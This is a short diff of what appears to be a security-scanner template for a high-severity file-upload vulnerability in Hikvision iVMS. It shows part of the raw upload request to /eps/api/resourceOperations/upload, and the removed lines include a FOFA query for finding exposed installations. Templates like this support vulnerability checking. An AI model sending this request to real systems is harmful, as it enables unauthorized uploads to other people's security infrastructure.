@@ -3,12 +3,8 @@ info:
   name: 海康iVMS综合安防存在文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tohkoz3t8lqygs3s'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tohkoz3t8lqygs3s
-    fofa: web.body="/views/home/file/installPackage.rar"
 http:
 - raw:
   - 'POST /eps/api/resourceOperations/upload HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Upgrade-Insecure-Requests: 1
-
-
 
 
     service=http%3A%2F%2Fip:port%3Ax%2Fhome%2Findex.action
